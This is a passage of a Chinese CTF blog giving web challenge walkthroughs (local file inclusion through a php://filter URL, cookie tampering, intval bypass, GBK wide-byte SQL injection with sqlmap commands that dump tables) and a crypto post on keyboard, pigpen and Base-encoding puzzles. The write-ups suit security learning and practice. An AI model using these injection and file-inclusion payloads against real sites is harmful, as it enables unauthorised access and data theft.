alt="在这里插入图片描述"><br>发现有个<code>SO.htm</code>，输入到url地址栏，并查看源码<br><img src="http://img-blog.csdnimg.cn/20190725141621676.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有个<code>S0.htm</code>，输入到url地址栏，并查看源码<br><img src="http://img-blog.csdnimg.cn/20190725141652320.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有个<code>404.html</code>，输入到url地址栏<br><img src="http://img-blog.csdnimg.cn/20190725141757222.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码<br><img src="http://img-blog.csdnimg.cn/20190725141939112.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现flag了，flag是<code>nctf{this_is_a_fl4g}</code>。果然是层层递进。。。。。</p><h4 id="Web6：AAencode"><a href="#Web6：AAencode" class="headerlink" title="Web6：AAencode"></a>Web6：AAencode</h4><p><img src="http://img-blog.csdnimg.cn/20190725142815483.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先百度AAencode：</p><pre><code class="js">什么是jjencode?将JS代码转换成只有符号的字符串什么是aaencode？将JS代码转换成常用的网络表情。</code></pre><p>根据题目描述，这是一道颜文字js加密，但是密文不应该是这样。所以应该编码有问题。用火狐打开，单击查看–&gt;文字编码–&gt;unicode<br><img src="http://img-blog.csdnimg.cn/20190725145133538.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编码成功，然后进行颜文字解密。可以用火狐的控制台，也可以用谷歌的Console<br><img src="http://img-blog.csdnimg.cn/20190725145727457.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190725145738557.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web7：单身二十年"><a href="#Web7：单身二十年" class="headerlink" title="Web7：单身二十年"></a>Web7：单身二十年</h4><p>打开题目，查看源码<br><img src="http://img-blog.csdnimg.cn/20190725160423304.jpg" alt="在这里插入图片描述"><br>点击，发现并没有进入到search_key.php。应该是重定向了。<br><img src="http://img-blog.csdnimg.cn/2019072516531452.jpg" alt="在这里插入图片描述"><br>所以抓包，发送到Repeater<br><img src="http://img-blog.csdnimg.cn/20190725155243108.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Go，发包，得到flag了<br><img src="http://img-blog.csdnimg.cn/20190725160020676.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web8：php-decode"><a href="#Web8：php-decode" class="headerlink" title="Web8：php decode"></a>Web8：php decode</h4><p><img src="http://img-blog.csdnimg.cn/20190725160707542.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>审计php代码。发现eval函数1，先百度一下eval：<br>eval() 函数用来执行一个字符串表达式，并返回表达式的值。<br>eval()函数会执行括号里面的语句，这种代码在现实中一般是某个黑客上传的一句话马。<br>但在这里eval里面肯定就是flag了，所以将eval改为echo输出eval里面的内容<br><img src="http://img-blog.csdnimg.cn/20190725161828215.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行php代码，得到flag<br><img src="http://img-blog.csdnimg.cn/2019072516190471.jpg" alt="在这里插入图片描述"></p><h4 id="Web9：文件包含"><a href="#Web9：文件包含" class="headerlink" title="Web9：文件包含"></a>Web9：文件包含</h4><p><img src="http://img-blog.csdnimg.cn/20190725162118650.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击”click me? no”，发现存在文件包含</p><pre><code class="php">http://4.chinalover.sinaapp.com/web7/index.php?file=show.php</code></pre><p>文件包含？！不会。。。了解一下吧！<br><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a><br><a href="https://blog.csdn.net/qq_40424939/article/details/80641480" target="_blank" rel="noopener">文件包含</a><br><strong>解释：</strong><br>LFI是能够打开并包含本地文件的漏洞</p><p>所以这道题是本地文件包含， 尝试使用伪协议读取php文件</p><pre><code class="php">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>得到base64加密后的字符串<br><img src="http://img-blog.csdnimg.cn/2019072516425269.jpg" alt="在这里插入图片描述"><br>Base64解密，看到原内容，得到flag。<br><img src="http://img-blog.csdnimg.cn/20190725162835724.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web10：单身一百年也没用"><a href="#Web10：单身一百年也没用" class="headerlink" title="Web10：单身一百年也没用"></a>Web10：单身一百年也没用</h4><p>这道题Web7单身二十年很像，但当我们直接点击“到这里找KEY”然后再进行抓包时，找不到异常。<br>额。不会了。。查看一下大佬的博客，了解到<br>当我们先抓包再点击接着再抓包时候会找到302重定向错误代码，这时候可以在响应头中找到flag。<br>大佬用的是火狐，而我的火狐有点问题，没有抓到中间重定向的包。<br>所以我直接用的谷歌的Network<br><img src="http://img-blog.csdnimg.cn/20190725164059253.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度302错误代码：302重定向又称之为302代表暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。</p><p><strong>Web：Download~!</strong><br>题崩了，打不开了。。。。</p><h4 id="Web11：COOKIE"><a href="#Web11：COOKIE" class="headerlink" title="Web11：COOKIE"></a>Web11：COOKIE</h4><p><img src="http://img-blog.csdnimg.cn/20190725170525299.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个提示<code>0==not</code><br>点开题目<br><img src="http://img-blog.csdnimg.cn/2019072517061631.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>“please login first!”翻译成“请先登录！”，burpsuite抓包<br><img src="http://img-blog.csdnimg.cn/20190725170833586.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现<code>Cookie：Login=0</code>，而<code>0===not</code>，所以将0改为1，再点击Forword发包，得到flag<br><img src="http://img-blog.csdnimg.cn/2019072517103284.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web12：MYSQL"><a href="#Web12：MYSQL" class="headerlink" title="Web12：MYSQL"></a>Web12：MYSQL</h4><p>题目没有提示，点开题目<br><img src="http://img-blog.csdnimg.cn/20190725171830787.jpg" alt="在这里插入图片描述"><br><code>robots.txt</code>这个我知道,之前做攻防世界的Web题遇到过<br><strong>robots协议</strong><br>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。<br>所以在url栏里输入robots.txt<br><img src="http://img-blog.csdnimg.cn/20190725172138596.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现提示<code>sql.php</code>，在另一窗口打开。然后审计php代码，发现intval() 函数，百度一下<br><strong>intval() 函数</strong><br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>理解一下php代码<br>1、<code>$id</code>等于<code>$_GET[id]</code>的整数值<br>2、sql查询语句<code>id=&#39;$id&#39;</code><br>3、如果 <code>$_GET[id]==1024</code>返回“no! try again”，否则返回数据库content字段内容<br>所以在sql.php页面进行get传参。get传递的参数不能等于1024，且查询时id=1024，所以get传一个整数部分为1024的浮点数即可。最终得到flag。<br><img src="http://img-blog.csdnimg.cn/20190725172343565.jpg" alt="在这里插入图片描述"></p><h4 id="Web13：GBK-Injection"><a href="#Web13：GBK-Injection" class="headerlink" title="Web13：GBK Injection"></a>Web13：GBK Injection</h4><p><img src="http://img-blog.csdnimg.cn/2019072518325518.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这道题是宽字节注入，我还没学到，就先用sqlmap做一下吧，正好可以熟悉熟悉sqlmap命令的使用<br>至于为什么要加<code>%df</code><br><code>%df%27</code>是双字节不转义单引号实现注入的方法，具体看大佬博客<br><a href="https://blog.csdn.net/weixin_42419856/article/details/82872653" target="_blank" rel="noopener">gbk字符编码和宽字节sql注入</a><br>1、爆库<br>命令：</p><pre><code class="sql">sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --current-db</code></pre><p><img src="http://img-blog.csdnimg.cn/20190725191311163.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以当前数据库为：<code>sae-chinaover</code><br>2、爆表<br>命令：</p><pre><code class="sql">sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --tables -D sae-chinalover</code></pre><p><img src="http://img-blog.csdnimg.cn/20190725191748838.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、爆字段和数据<br>发现6个表，根据题目标题GBK Injection，所以flag有可能在gbksqli表里<br>命令：</p><pre><code class="sql">sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --dump -T gbksqli -D sae-chinalover</code></pre><p><img src="http://img-blog.csdnimg.cn/20190725192916463.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当然，如果没想到这个表，可以一个表一个表的试。需要注意的是，在ctf4表里也出现了flag<br><img src="http://img-blog.csdnimg.cn/20190725193108695.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但这个并不是这道题的答案。</p><h4 id="Web14：变量覆盖"><a href="#Web14：变量覆盖" class="headerlink" title="Web14：变量覆盖"></a>Web14：变量覆盖</h4><p><img src="http://img-blog.csdnimg.cn/20190725195919952.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>似乎没听说过，那先了解一下有关变量覆盖的基础知识吧<br><a href="https://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="noopener">变量覆盖漏洞详解</a><br><a href="https://www.jianshu.com/p/a4d782e91852" target="_blank" rel="noopener">CTF之php变量覆盖漏洞</a><br>开始做题<br><img src="http://img-blog.csdnimg.cn/20190725200114570.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点开显眼的source.php文件<br><img src="http://img-blog.csdnimg.cn/20190725200147103.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>审计php代码，发现如果<code>$pass==$thepassword_123</code>就显示flag。所以构造get传参值，让两变量相等<br><img src="http://img-blog.csdnimg.cn/20190725200418740.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。<br>就先总结这么多吧。。。。。。。。。。。。</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>题不是太难，重点是基础知识的掌握。尤其是文件包含的理解和代码审计的能力。<br>小白进阶ing。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 南邮 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-简单加密</title>
      <link href="/2019/07/21/Crypto-%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/07/21/Crypto-%E7%AE%80%E5%8D%95%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于上次总结了位移编码，于是又补了一篇简单加密。</p><h3 id="围在栅栏中的爱"><a href="#围在栅栏中的爱" class="headerlink" title="围在栅栏中的爱"></a>围在栅栏中的爱</h3><p><img src="http://img-blog.csdnimg.cn/20190728153324519.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先看到密文，这是摩斯电码<br><img src="http://img-blog.csdnimg.cn/20190728164250404.jpg" alt="在这里插入图片描述"><br>可以直接在线摩斯电码解密：<br><img src="http://img-blog.csdnimg.cn/20190728153526461.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到英文字母<code>KIQLWTFCQGNSOO</code><br>发现并没有什么规律，根据题目“围在栅栏中的爱”，进行栅栏解密也得不到有用信息。<br>看到题目描述“最近一直在好奇一个问题，QWE到底等不等于ABC？”<br>QWE？！很明显这是键盘密码的键盘替换密码，也就是键盘QWE加密法<br>了解一下相关知识：</p><h4 id="电脑键盘加密"><a href="#电脑键盘加密" class="headerlink" title="电脑键盘加密"></a>电脑键盘加密</h4><p><strong>包围圈加密</strong><br>如：<br>k我们可以加密为ijml<br>l可以加密为pkm<br><strong>竖对称加密</strong><br>如：<br>l对称a<br>o对称w<br>v对称v(中心点不加密)<br>e对称i<br><strong>qwe v码</strong><br>如：<br>a=qw s=we q=12 z=as<br><strong>夹位法</strong><br>如：<br>a=qz w=sx k=i p=p<br><strong>凯撒移位</strong><br>明文:help<br>密文:jrza<br><strong>猪圈带入</strong><br>如：<br>d=qwed<br><strong>键盘手势</strong><br>看手运动的轨迹<br>如：<br>ytfvbhn手势是a<br><strong>QWE替换加密</strong><br>如：<br>QWERT对应ABCDE<br>当然还有很多，可以了解一下</p><p>开始做题<br>因为这道题涉及了QWE替换加密，所以配一张图<br><img src="http://img-blog.csdnimg.cn/20190728161647231.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以一个一个进行对照，当然这也有个大佬的脚本</p><pre><code class="python">def search(x):    return{&#39;q&#39;:&#39;a&#39;,&#39;w&#39;:&#39;b&#39;,&#39;e&#39;:&#39;c&#39;,&#39;r&#39;:&#39;d&#39;,&#39;t&#39;:&#39;e&#39;,&#39;y&#39;:&#39;f&#39;,&#39;u&#39;:&#39;g&#39;,&#39;i&#39;:&#39;h&#39;,&#39;o&#39;:&#39;i&#39;,&#39;p&#39;:&#39;j&#39;,&#39;a&#39;:&#39;k&#39;,    &#39;s&#39;:&#39;l&#39;,&#39;d&#39;:&#39;m&#39;,&#39;f&#39;:&#39;n&#39;,&#39;g&#39;:&#39;o&#39;,&#39;h&#39;:&#39;p&#39;,&#39;j&#39;:&#39;q&#39;,&#39;k&#39;:&#39;r&#39;,    &#39;l&#39;:&#39;s&#39;,&#39;z&#39;:&#39;t&#39;,&#39;x&#39;:&#39;u&#39;,&#39;c&#39;:&#39;v&#39;,&#39;v&#39;:&#39;w&#39;,&#39;b&#39;:&#39;x&#39;,&#39;n&#39;:&#39;y&#39;,&#39;m&#39;:&#39;z&#39;,    }.get(x,x)def main():    print(&quot;QWE键盘解密程序&quot;)    print(&quot;请输入待解密的字符串：&quot;)    while True:        try:            miwen=input()            miwen=miwen.lower()            print(&quot;结果是：&quot;)            for i in miwen:                print(search(i),end=&#39;&#39;)            print(&quot;\n&quot;)        except:            breakif __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190728162833695.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>密文为：KIQLWTFCQGNSOO<br>解密后：RHASBENVAOYLII<br>然后再根据题目标题，想到栅栏解密，结果有两种：<br>第1种：RABNAYIHSEVOLI<br>第2种：RVHAAOSYBLEINI<br>很显然是第一种结果的倒序，反转以后结果如下：<br>ILOVESHIYANBAR<br>试了之后发现最后结果要小写，有点坑。。。</p><h3 id="小心猪圈"><a href="#小心猪圈" class="headerlink" title="小心猪圈"></a>小心猪圈</h3><p><img src="http://img-blog.csdnimg.cn/20190728174928459.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很明显是Base64加密的，所以了解一下Base64、Base32和Base16：</p><h4 id="Base64、Base32、Base16"><a href="#Base64、Base32、Base16" class="headerlink" title="Base64、Base32、Base16"></a>Base64、Base32、Base16</h4><p><strong>范围</strong><br>Base64范围：A-Z、a-z、0-9、+/<br>Base32范围：A-Z、2-7<br>Base16范围：0-9、A-F<br>当ASCll用Base加密达不到所对应的位数的时候用=号补齐<br><strong>编码方式</strong><br>ASCII 是用128（2的8次方）个字符，对二进制数据进行编码的方式<br>base64编码是用64（2的6次方）个字符，对二进制数据进行编码的方式<br>base32就是用32（2的5次方）个字符，对二进制数据进行编码的方式<br>base16就是用16（2的4次方）个字符，对二进制数据进行编码的方式<br><strong>Base64</strong><br>Base64加密方式是将三个八位的字节转化为四个六位的字节（不足八位的高位补00），3<em>8 = 4</em>6；，所以base64加密过后的内容比原来的大三分之一；<br>如：加密“ace”<br>ace转化为二进制为：‭01100001‬ ‭01100011‬ ‭01100101‬<br>转化为base64的四字节六位：011000 01‬‭0110 0011‬01 100101‬<br>那因为计算机是一字节八位的存数，所以高位补00后变为：00011000 0001‬‭0110 000011‬01 00100101‬<br>转化为十进制：24 22 13 37<br><img src="http://img-blog.csdnimg.cn/20190728175811144.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Base32</strong></p><p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。<br><img src="http://img-blog.csdnimg.cn/201907281810585.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Base16</strong><br>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。Base16先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制，在下述表格中找到对应的编码串接起来就是Base16编码。可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“=”。<br><img src="http://img-blog.csdnimg.cn/20190728181232855.jpg" alt="在这里插入图片描述"><br>了解结束开始做题，首先将题目字符串进行Base64解密<br><img src="http://img-blog.csdnimg.cn/20190728181419369.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现16进制数值，然后Base16解密<br><img src="http://img-blog.csdnimg.cn/20190728181620408.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现数字最大小于7，所以Base32解密<br><img src="http://img-blog.csdnimg.cn/20190728181707983.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后又发现是Base64，所以Base64解密<br><img src="http://img-blog.csdnimg.cn/20190728181751452.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现flag那种样式了，然后根据题目“小心猪圈”，应该就是猪圈密码解密了，先了解一下猪圈密码：</p><h4 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h4><p>猪圈密码还有一个名字叫共济会密码，属于最古老的密码之一，也是密码学里最简单易懂的密码。它是以格子为基准的简单代替式逻辑密码，无论怎么变化都可以找到逻辑替代的方法，曾经是美国内战时盟军使用的密码。<br><img src="http://img-blog.csdnimg.cn/2019072818281654.png" alt="在这里插入图片描述"><br>对应下图就是：HORSE<br><img src="http://img-blog.csdnimg.cn/201907281828480.png" alt="在这里插入图片描述"><br>下面给了个猪圈密码的对照表<br><img src="http://img-blog.csdnimg.cn/20190728182901769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以对密文：<code>ocjp{zkirjwmo-ollj-nmlw-joxi-tmolnrnotvms}</code><br>进行猪圈对照，ocjp对应flag，依次对照得到flag<br>上边那个QWE键盘加密的脚本改写写一下就可以了</p><pre><code class="python">def search(x):    return{&#39;j&#39;:&#39;a&#39;,&#39;k&#39;:&#39;b&#39;,&#39;l&#39;:&#39;c&#39;,&#39;m&#39;:&#39;d&#39;,&#39;n&#39;:&#39;e&#39;,&#39;o&#39;:&#39;f&#39;,&#39;p&#39;:&#39;g&#39;,&#39;q&#39;:&#39;h&#39;,&#39;r&#39;:&#39;i&#39;,&#39;w&#39;:&#39;s&#39;,&#39;x&#39;:&#39;t&#39;,    &#39;y&#39;:&#39;u&#39;,&#39;z&#39;:&#39;v&#39;,&#39;a&#39;:&#39;j&#39;,&#39;b&#39;:&#39;k&#39;,&#39;c&#39;:&#39;l&#39;,&#39;d&#39;:&#39;m&#39;,&#39;e&#39;:&#39;n&#39;,    &#39;f&#39;:&#39;o&#39;,&#39;g&#39;:&#39;p&#39;,&#39;h&#39;:&#39;q&#39;,&#39;i&#39;:&#39;r&#39;,&#39;s&#39;:&#39;w&#39;,&#39;t&#39;:&#39;x&#39;,&#39;u&#39;:&#39;y&#39;,&#39;v&#39;:&#39;z&#39;,    }.get(x,x)def main():    print(&quot;解密程序&quot;)    print(&quot;请输入待解密的字符串：&quot;)    while True:        try:            miwen=input()            miwen=miwen.lower()            print(&quot;结果是：&quot;)            for i in miwen:                print(search(i),end=&#39;&#39;)            print(&quot;\n&quot;)        except:            breakif __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190728195120761.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h3><p><img src="http://img-blog.csdnimg.cn/20190728190304558.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载题目，并打开<br><img src="http://img-blog.csdnimg.cn/20190728190456177.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现是Base64，Base64解密得<br><img src="http://img-blog.csdnimg.cn/2019072819061259.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密结果是Unicode？！了解一下</p><h4 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h4><p>Unicode编码后的大小是一样的.例如一个英文字母 “a” 和　一个汉字 “好”，编码后都是占用的空间大小是一样的，都是两个字节！Unicode可以用来表示所有语言的字符，而且是定长双字节（也有四字节的）编码，包括英文字母在内。<br> 